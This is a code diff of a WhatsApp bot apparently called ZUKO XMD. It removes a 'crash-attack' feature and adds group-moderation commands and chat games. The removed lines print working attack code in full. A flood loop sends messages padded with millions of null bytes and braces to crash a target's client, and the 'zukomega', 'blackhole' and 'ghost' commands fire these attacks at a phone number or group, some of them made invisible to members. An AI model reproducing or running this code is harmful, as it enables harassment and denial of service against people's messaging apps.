-      empire.relayMessage(target, payload4, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, payload5, { participant: { jid: target } }).catch(() => {})
-    ]);
-
-    // Log progress every 10 iterations
-    if (i % 10 === 0) {
-      console.log(chalk.red(`💀 ZUKOXMD OMEGA Progress: ${i}/200 on ${target}`));
-    }
-
-    // Small delay to prevent complete self-crash
-    await sleep(150);
-  }
-
-  // Final surge: 50 extra iterations with only the heaviest payloads
-  for (let i = 0; i < 50; i++) {
-    await Promise.all([
-      empire.relayMessage(target, {
-        viewOnceMessage: {
-          message: {
-            interactiveMessage: {
-              body: { text: '\u0000'.repeat(9999999) },
-              nativeFlowMessage: {
-                messageParamsJson: '{'.repeat(9999999) + '}'.repeat(9999999),
-                buttons: [
-                  { name: 'single_select', buttonParamsJson: '\u0000'.repeat(9999999) },
-                  { name: 'call_permission_request', buttonParamsJson: '\u0000'.repeat(9999999) }
-                ]
-              }
-            }
-          }
-        }
-      }, { participant: { jid: target } }).catch(() => {}),
-      empire.relayMessage(target, {
-        newsletterAdminInviteMessage: {
-          newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
-          newsletterName: '\u0000'.repeat(9999999),
-          caption: '\u0000'.repeat(9999999),
-          inviteExpiration: '0'
-        }
-      }, { participant: { jid: target } }).catch(() => {})
-    ]);
-    await sleep(50);
-  }
-
-  console.log(chalk.green(`✅ ZUKOXMD OMEGA COMPLETE on ${target}`));
-  console.log(chalk.red(`💀 TARGET ${target} HAS BEEN OBLITERATED 💀`));
-}
-
 
 // ========== ANTI-TAG HANDLER ==========
 async function handleAntiTag(empire, m, isCreator, isAdmins) {
@@ -1356,6 +308,83 @@ const antidelete = (() => {
 
     return { storeMessage, handleRevocation, handleCommand };
 })();
+
+// ========== GAME STATE (in-memory, per chat) ==========
+const tttGames = new Map();      // chat -> { board, players: {X, O}, turn, vsBot }
+const hangmanGames = new Map();  // chat -> { word, category, guessed, wrong, maxWrong }
+
+// ========== TIC TAC TOE HELPERS ==========
+const TTT_NUMBERS = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
+
+function renderTTTBoard(board) {
+    const cells = board.map((v, i) => (v === '' ? TTT_NUMBERS[i] : v === 'X' ? '❌' : '⭕'));
+    return `${cells[0]}${cells[1]}${cells[2]}\n${cells[3]}${cells[4]}${cells[5]}\n${cells[6]}${cells[7]}${cells[8]}`;
+}
+
+function checkTTTWinner(board) {
+    const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+    for (const [a, b, c] of lines) {
+        if (board[a] && board[a] === board[b] && board[a] === board[c]) return board[a];
+    }
+    if (board.every(c => c !== '')) return 'draw';
+    return null;
+}
+
+function botTTTMove(board) {
+    const empty = board.map((v, i) => (v === '' ? i : null)).filter(v => v !== null);
+    for (const i of empty) {
+        const copy = [...board]; copy[i] = 'O';
+        if (checkTTTWinner(copy) === 'O') return i;
+    }
+    for (const i of empty) {
+        const copy = [...board]; copy[i] = 'X';
+        if (checkTTTWinner(copy) === 'X') return i;
+    }
+    if (board[4] === '') return 4;
+    const corners = [0, 2, 6, 8].filter(i => board[i] === '');
+    if (corners.length) return corners[Math.floor(Math.random() * corners.length)];
+    return empty[Math.floor(Math.random() * empty.length)];
+}
+
+// ========== HANGMAN HELPERS ==========
+const HANGMAN_WORDS = [
+    { word: 'javascript', category: 'Programming' },
+    { word: 'baileys', category: 'Programming' },
+    { word: 'elephant', category: 'Animals' },
+    { word: 'giraffe', category: 'Animals' },
+    { word: 'dolphin', category: 'Animals' },
+    { word: 'mountain', category: 'Nature' },
+    { word: 'waterfall', category: 'Nature' },
+    { word: 'universe', category: 'Science' },
+    { word: 'telescope', category: 'Science' },
+    { word: 'birthday', category: 'Events' },
+    { word: 'sandwich', category: 'Food' },
+    { word: 'pineapple', category: 'Food' },
+    { word: 'chocolate', category: 'Food' },
+    { word: 'guitar', category: 'Music' },
+    { word: 'keyboard', category: 'Music' },
+    { word: 'football', category: 'Sports' },
+    { word: 'basketball', category: 'Sports' },
+    { word: 'whatsapp', category: 'Apps' },
+    { word: 'painting', category: 'Art' },
+    { word: 'astronaut', category: 'Space' }
+];
+
+const HANGMAN_STAGES = [
+    "┌───┐\n│   │\n│    \n│    \n│    \n─┴─",
+    "┌───┐\n│   │\n│   😵\n│    \n│    \n─┴─",
+    "┌───┐\n│   │\n│   😵\n│   │\n│    \n─┴─",
+    "┌───┐\n│   │\n│   😵\n│  /│\n│    \n─┴─",
+    "┌───┐\n│   │\n│   😵\n│  /│\\\n│    \n─┴─",
+    "┌───┐\n│   │\n│   😵\n│  /│\\\n│  /  \n─┴─",
+    "┌───┐\n│   │\n│   💀\n│  /│\\\n│  / \\\n─┴─"
+];
+
+function renderHangman(game) {
+    const displayWord = game.word.split('').map(c => (game.guessed.has(c) ? c.toUpperCase() : '_')).join(' ');
+    const wrongLetters = [...game.guessed].filter(l => !game.word.includes(l));
+    return `${HANGMAN_STAGES[game.wrong]}\n\n📝 ${displayWord}\n\n❤️ Lives: ${game.maxWrong - game.wrong}/${game.maxWrong}\n❌ Wrong: ${wrongLetters.join(', ') || 'none'}`;
+}
 
 // ========== WELCOME / GOODBYE HANDLER ==========
 async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botNumber) {
@@ -1534,7 +563,7 @@ case 'pong': {
     const up = process.uptime();
     const upStr = `${Math.floor(up/86400)}d ${Math.floor((up%86400)/3600)}h ${Math.floor((up%3600)/60)}m`;
     const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
-    const totalCmds = 60; // updated count
+    const totalCmds = 78; // updated count
 
     const menuText =
 `╭───⟡ ZUKO XMD ⟡───╮
@@ -1580,6 +609,15 @@ case 'pong': {
 ┃ ${prefix}promote
 ┃ ${prefix}demote
 ┃ ${prefix}kick
+┃ ${prefix}add
+┃ ${prefix}mute
+┃ ${prefix}unmute
+┃ ${prefix}grouplink
+┃ ${prefix}setgcpp
+┃ ${prefix}listadmins
+┃ ${prefix}warn
+┃ ${prefix}unwarn
+┃ ${prefix}warnings
 ┃ ${prefix}setgcname
 ┃ ${prefix}gcdescription
 ┃ ${prefix}resetlink
@@ -1599,12 +637,12 @@ case 'pong': {
 ┃ ${prefix}antibot
 ┗━━━━━━━━━━━━━━━┛
 
-┏━━ 💀 CRASH-ATTACK ━━┓
-┃ ${prefix}zukomega
-┃ ${prefix}ghost
-┃ ${prefix}blackhole
-┗━━━━━━━━━━━━━━━━━━━┛
-
+┏━━ 🎮 GAMES ━━┓
+┃ ${prefix}tictactoe
+┃ ${prefix}hangman
+┃ ${prefix}guess
+┃ ${prefix}rps
+┗━━━━━━━━━━━━━━┛
 
      ✦ DEV ZUKO ✦`;
 
@@ -3231,6 +2269,171 @@ ${adminList}`,
         }
 
         // ═══════════════════════════════════════════════════
+        // MUTE / UNMUTE - lock group to admins only
+        // ═══════════════════════════════════════════════════
+        case 'mute':
+        case 'lock':
+        case 'groupmute': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
+            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
+            await empire.groupSettingUpdate(m.chat, 'announcement').catch(() => {});
+            reply("🔒 *Group locked!* Only admins can send messages now.");
+            break;
+        }
+        case 'unmute':
+        case 'unlock':
+        case 'groupunmute': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
+            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
+            await empire.groupSettingUpdate(m.chat, 'not_announcement').catch(() => {});
+            reply("🔓 *Group unlocked!* Everyone can send messages now.");
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // ADD - add a participant by number
+        // ═══════════════════════════════════════════════════
+        case 'add': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
+            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
+            const num = (text || '').replace(/[^0-9]/g, '');
+            if (!num) return reply(`Usage: ${prefix}add <phone number with country code>`);
+            const targetJid = num + '@s.whatsapp.net';
+            try {
+                await empire.groupParticipantsUpdate(m.chat, [targetJid], 'add');
+                await empire.sendMessage(m.chat, {
+                    text: `✅ Added @${num} to the group!`,
+                    mentions: [targetJid],
+                    contextInfo: newsletterContext({ mentionedJid: [targetJid] })
+                }, { quoted: m });
+            } catch (e) {
+                reply(`❌ Couldn't add @${num}. They may have privacy settings preventing this, or an invalid number was given.`);
+            }
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // GROUPLINK - fetch the group invite link
+        // ═══════════════════════════════════════════════════
+        case 'grouplink':
+        case 'invitelink':
+        case 'link': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
+            try {
+                const code = await empire.groupInviteCode(m.chat);
+                reply(`🔗 *Group Invite Link*\n\nhttps://chat.whatsapp.com/${code}`);
+            } catch (e) {
+                reply("❌ Couldn't fetch invite link.");
+            }
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // SETGCPP - set group profile picture
+        // ═══════════════════════════════════════════════════
+        case 'setgcpp':
+        case 'setgroupicon':
+        case 'setgcicon': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
+            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
+            const quoted = m.quoted ? m.quoted : m;
+            const mime = quoted.mimetype || '';
+            if (!/image/.test(mime)) {
+                return reply(`🖼️ *Usage:* Reply to an image with:\n${prefix}setgcpp\n\nSets the group's profile picture.`);
+            }
+            try {
+                await reply('⏳ *Updating group picture...*');
+                const mediaBuffer = await empire.downloadMediaMessage(quoted);
+                if (!mediaBuffer || mediaBuffer.length === 0) return reply('❌ Failed to download image.');
+                await empire.updateProfilePicture(m.chat, mediaBuffer);
+                reply('✅ *Group picture updated successfully!*');
+            } catch (e) {
+                reply(`❌ *Failed to update group picture:* ${e.message || 'Unknown error'}`);
+            }
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // WARN SYSTEM - warn / unwarn / warnings
+        // ═══════════════════════════════════════════════════
+        case 'warn': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
+            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
+            if (!target) return reply(`Usage: ${prefix}warn @user`);
+            const k = `${m.chat}_${target}`;
+            db.warns[k] = (db.warns[k] || 0) + 1;
+            saveDB();
+            const count = db.warns[k];
+            await empire.sendMessage(m.chat, {
+                text: `⚠️ @${target.split('@')[0]} has been warned! (${count}/3)`,
+                mentions: [target],
+                contextInfo: newsletterContext({ mentionedJid: [target] })
+            }, { quoted: m });
+            if (count >= 3) {
+                await empire.groupParticipantsUpdate(m.chat, [target], 'remove').catch(() => {});
+                delete db.warns[k];
+                saveDB();
+                await empire.sendMessage(m.chat, {
+                    text: `👢 @${target.split('@')[0]} reached 3 warnings and was removed.`,
+                    mentions: [target],
+                    contextInfo: newsletterContext({ mentionedJid: [target] })
+                });
+            }
+            break;
+        }
+        case 'unwarn':
+        case 'resetwarn': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
+            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
+            if (!target) return reply(`Usage: ${prefix}unwarn @user`);
+            const k = `${m.chat}_${target}`;
+            delete db.warns[k];
+            saveDB();
+            await empire.sendMessage(m.chat, {
+                text: `✅ Warnings cleared for @${target.split('@')[0]}.`,
+                mentions: [target],
+                contextInfo: newsletterContext({ mentionedJid: [target] })
+            }, { quoted: m });
+            break;
+        }
+        case 'warnings':
+        case 'warncount': {
+            if (!isGroup) return reply("👥 Group only!");
+            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null) || m.sender;
+            const k = `${m.chat}_${target}`;
+            const count = db.warns[k] || 0;
+            await empire.sendMessage(m.chat, {
+                text: `⚠️ @${target.split('@')[0]} has ${count}/3 warnings.`,
+                mentions: [target],
+                contextInfo: newsletterContext({ mentionedJid: [target] })
+            }, { quoted: m });
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // LISTADMINS
+        // ═══════════════════════════════════════════════════
+        case 'listadmins':
+        case 'admins': {
+            if (!isGroup) return reply("👥 Group only!");
+            if (groupAdmins.length === 0) return reply("❌ No admins found.");
+            const list = groupAdmins.map(a => `👑 @${a.split('@')[0]}`).join('\n');
+            await empire.sendMessage(m.chat, {
+                text: `👑 *GROUP ADMINS (${groupAdmins.length})*\n\n${list}`,
+                mentions: groupAdmins,
+                contextInfo: newsletterContext({ mentionedJid: groupAdmins })
+            }, { quoted: m });
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
         // ANTILINK
         // ═══════════════════════════════════════════════════
         case 'antilink':
@@ -3399,54 +2602,187 @@ ${adminList}`,
             reply(`✅ *Goodbye message set!*\n\n${text}`);
             break;
         }
-        case 'zukomega':
-case 'zomegastrike':
-case 'zukoomega': {
-  if (!isCreator) return zreply("*This command is for bot owners only.*");
-  if (!q) return zreply(`Usage: ${prefix+command} 234705xxx`);
-  let jidx = q.replace(/[^0-9]/g, "");
-  if (jidx.startsWith('0')) return zreply(`Usage: ${prefix+command} 234705xxx !!`);
-  if (jidx === "2347059886720") return zreply("❌ This number is protected.");
 
-  let isTarget = `${jidx}@s.whatsapp.net`;
-  let Menu = `⚡ ZUKOXMD OMEGA STRIKE ⚡\n\nTarget: ${isTarget}\nAttack: OMEGA HYBRID\n\nWaiting 5-10 minutes for effect...`;
-  sreply(Menu);
+        // ═══════════════════════════════════════════════════
+        // TIC TAC TOE
+        // ═══════════════════════════════════════════════════
+        case 'tictactoe':
+        case 'ttt': {
+            const existing = tttGames.get(m.chat);
+            const arg = args[0]?.toLowerCase();
 
-  await ZukoOmegaStrike(isTarget);
-}
-break;
+            // ── Make a move ──
+            if (existing && arg && /^[1-9]$/.test(arg)) {
+                const pos = parseInt(arg, 10) - 1;
+                const mySymbol = existing.players.X === m.sender ? 'X' : existing.players.O === m.sender ? 'O' : null;
+                if (!mySymbol) return reply("❌ You're not a player in this game!");
+                if (existing.turn !== mySymbol) return reply("⏳ It's not your turn!");
+                if (existing.board[pos] !== '') return reply("❌ That cell is already taken!");
 
-case 'blackhole':
-case 'zblackhole':
-case 'zuko-blackhole': {
-  if (!isCreator) return zreply("*This command is for bot owners only.*");
-  if (!q) return zreply(`Usage: ${prefix+command} 234705xxx`);
-  
-  let jidx = q.replace(/[^0-9]/g, "");
-  if (jidx.startsWith('0')) return zreply(`Usage: ${prefix+command} 234705xxx !!`);
-  if (jidx === "2347059886720") return zreply("❌ This number is protected.");
+                existing.board[pos] = mySymbol;
+                let winner = checkTTTWinner(existing.board);
 
-  let isTarget = `${jidx}@s.whatsapp.net`;
-  let Menu = `🕳️ ZUKO BLACKHOLE 🕳️\n\nTarget: ${isTarget}\nAttack: BLACKHOLE HYBRID\n\nWaiting 5-10 minutes for effect...\n\n⚠️ This attack uses:\n- 150 reaction/poll/payment floods\n- 100 final surge iterations\n- 2000 poll options per message\n- Massive malformed JSON payloads`;
-  sreply(Menu);
+                if (winner) {
+                    tttGames.delete(m.chat);
+                    const boardText = renderTTTBoard(existing.board);
+                    if (winner === 'draw') {
+                        return reply(`🎮 *TIC TAC TOE*\n\n${boardText}\n\n🤝 It's a draw!`);
+                    }
+                    const winnerJid = existing.players[winner];
+                    const winMsg = winnerJid === 'bot' ? '🤖 Bot wins!' : `🏆 @${winnerJid.split('@')[0]} wins!`;
+                    await empire.sendMessage(m.chat, {
+                        text: `🎮 *TIC TAC TOE*\n\n${boardText}\n\n${winMsg}`,
+                        mentions: winnerJid !== 'bot' ? [winnerJid] : [],
+                        contextInfo: newsletterContext()
+                    }, { quoted: m });
+                    break;
+                }
 
-  await ZukoBlackHole(isTarget);
-}
-break;
+                existing.turn = existing.turn === 'X' ? 'O' : 'X';
 
-case 'ghost':
-case 'zghost':
-case 'zuko-ghost': {
-  if (!isCreator) return zreply("*This command is for bot owners only.*");
-  if (!m.isGroup) return zreply('*This attack only works in groups.*');
-  if (!isBotAdmins) return zreply('*Bot must be admin to execute ghost attacks.*');
+                // bot's turn
+                if (existing.vsBot && existing.players[existing.turn] === 'bot') {
+                    const botPos = botTTTMove(existing.board);
+                    existing.board[botPos] = existing.turn;
+                    const w2 = checkTTTWinner(existing.board);
+                    if (w2) {
+                        tttGames.delete(m.chat);
+                        const boardText2 = renderTTTBoard(existing.board);
+                        const msg2 = w2 === 'draw' ? "🤝 It's a draw!" : (w2 === existing.turn ? '🤖 Bot wins!' : '🏆 You win!');
+                        return reply(`🎮 *TIC TAC TOE*\n\n${boardText2}\n\n${msg2}`);
+                    }
+                    existing.turn = existing.turn === 'X' ? 'O' : 'X';
+                }
 
-  let Menu = `👻 ZUKO GHOST STRIKE 👻\n\nTarget Group: ${groupName}\nAttack: INVISIBLE CRASH\n\n⚠️ This attack is INVISIBLE to members:\n- No visible messages appear\n- No notifications\n- Client crashes silently\n\n⏳ Waiting 5-10 minutes for effect...\n\n🔥 Only admins and bot will know this happened.`;
-  sreply(Menu);
+                const nextJid = existing.players[existing.turn];
+                const turnText = nextJid === 'bot' ? "🤖 Bot's turn..." : `@${nextJid.split('@')[0]}'s turn (${existing.turn})`;
+                await empire.sendMessage(m.chat, {
+                    text: `🎮 *TIC TAC TOE*\n\n${renderTTTBoard(existing.board)}\n\n${turnText}`,
+                    mentions: nextJid !== 'bot' ? [nextJid] : [],
+                    contextInfo: newsletterContext()
+                }, { quoted: m });
+                break;
+            }
 
-  await ZukoGhostStrike(m.chat);
-}
-break;
+            // ── End game ──
+            if (arg === 'end' || arg === 'stop') {
+                if (!existing) return reply("❌ No active Tic Tac Toe game!");
+                tttGames.delete(m.chat);
+                reply("🛑 Tic Tac Toe game ended.");
+                break;
+            }
+
+            // ── Already running ──
+            if (existing) {
+                return reply(`🎮 A game is already in progress!\n\n${renderTTTBoard(existing.board)}\n\nUse ${prefix}ttt <1-9> to play, or ${prefix}ttt end to cancel.`);
+            }
+
+            // ── Start a new game ──
+            const opponent = m.mentionedJid?.[0];
+            if (opponent === m.sender) return reply("❌ You can't play against yourself!");
+            if (opponent === botNumber) return reply(`🤖 Just type \`${prefix}ttt\` alone to play against me!`);
+            const vsBot = !opponent;
+
+            const newGame = {
+                board: Array(9).fill(''),
+                players: { X: m.sender, O: vsBot ? 'bot' : opponent },
+                turn: 'X',
+                vsBot
+            };
+            tttGames.set(m.chat, newGame);
+
+            const startMsg = vsBot
+                ? `🎮 *TIC TAC TOE*\n\n${renderTTTBoard(newGame.board)}\n\n@${m.sender.split('@')[0]} (❌) vs 🤖 Bot (⭕)\n\nYour turn! Use ${prefix}ttt <1-9>`
+                : `🎮 *TIC TAC TOE*\n\n${renderTTTBoard(newGame.board)}\n\n@${m.sender.split('@')[0]} (❌) vs @${opponent.split('@')[0]} (⭕)\n\n@${m.sender.split('@')[0]}'s turn! Use ${prefix}ttt <1-9>`;
+
+            await empire.sendMessage(m.chat, {
+                text: startMsg,
+                mentions: vsBot ? [m.sender] : [m.sender, opponent],
+                contextInfo: newsletterContext()
+            }, { quoted: m });
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // HANGMAN
+        // ═══════════════════════════════════════════════════
+        case 'hangman':
+        case 'hm': {
+            const existing = hangmanGames.get(m.chat);
+            const arg = args[0]?.toLowerCase();
+
+            if (arg === 'end' || arg === 'stop') {
+                if (!existing) return reply("❌ No active Hangman game!");
+                hangmanGames.delete(m.chat);
+                reply(`🛑 Hangman ended. The word was *${existing.word.toUpperCase()}*.`);
+                break;
+            }
+
+            if (existing) {
+                return reply(`🎮 A Hangman game is already in progress!\n\n${renderHangman(existing)}\n\nUse ${prefix}guess <letter> to play.`);
+            }
+
+            const pick = HANGMAN_WORDS[Math.floor(Math.random() * HANGMAN_WORDS.length)];
+            const newGame = { word: pick.word.toLowerCase(), category: pick.category, guessed: new Set(), wrong: 0, maxWrong: 6 };
+            hangmanGames.set(m.chat, newGame);
+
+            reply(`🎮 *HANGMAN*\n\n📁 Category: ${newGame.category}\n\n${renderHangman(newGame)}\n\nGuess a letter with ${prefix}guess <letter>`);
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // GUESS - used for the active Hangman game
+        // ═══════════════════════════════════════════════════
+        case 'guess': {
+            const existing = hangmanGames.get(m.chat);
+            if (!existing) return reply(`❌ No active Hangman game! Start one with ${prefix}hangman`);
+
+            const letter = (args[0] || '').toLowerCase();
+            if (!letter || letter.length !== 1 || !/[a-z]/.test(letter)) {
+                return reply(`Usage: ${prefix}guess <a single letter>`);
+            }
+            if (existing.guessed.has(letter)) return reply(`❌ You've already guessed *${letter}*!`);
+
+            existing.guessed.add(letter);
+            if (!existing.word.includes(letter)) existing.wrong++;
+
+            const revealed = existing.word.split('').every(c => existing.guessed.has(c));
+            const lost = existing.wrong >= existing.maxWrong;
+
+            if (revealed) {
+                hangmanGames.delete(m.chat);
+                return reply(`🎉 *YOU WIN!*\n\nThe word was *${existing.word.toUpperCase()}*\n\n${renderHangman(existing)}`);
+            }
+            if (lost) {
+                hangmanGames.delete(m.chat);
+                return reply(`💀 *GAME OVER!*\n\nThe word was *${existing.word.toUpperCase()}*\n\n${renderHangman(existing)}`);
+            }
+            reply(`${renderHangman(existing)}\n\nGuess another letter with ${prefix}guess <letter>`);
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // ROCK PAPER SCISSORS
+        // ═══════════════════════════════════════════════════
+        case 'rps': {
+            const choices = ['rock', 'paper', 'scissors'];
+            const emojis = { rock: '🪨', paper: '📄', scissors: '✂️' };
+            const userChoice = (args[0] || '').toLowerCase();
+            if (!choices.includes(userChoice)) return reply(`Usage: ${prefix}rps <rock/paper/scissors>`);
+
+            const botChoice = choices[Math.floor(Math.random() * choices.length)];
+            let result;
+            if (userChoice === botChoice) result = "🤝 It's a tie!";
+            else if (
+                (userChoice === 'rock' && botChoice === 'scissors') ||
+                (userChoice === 'paper' && botChoice === 'rock') ||
+                (userChoice === 'scissors' && botChoice === 'paper')
+            ) result = '🎉 You win!';
+            else result = '🤖 Bot wins!';
+
+            reply(`🎮 *ROCK PAPER SCISSORS*\n\nYou: ${emojis[userChoice]} ${userChoice}\nBot: ${emojis[botChoice]} ${botChoice}\n\n${result}`);
+            break;
+        }
 
         default:
             break;
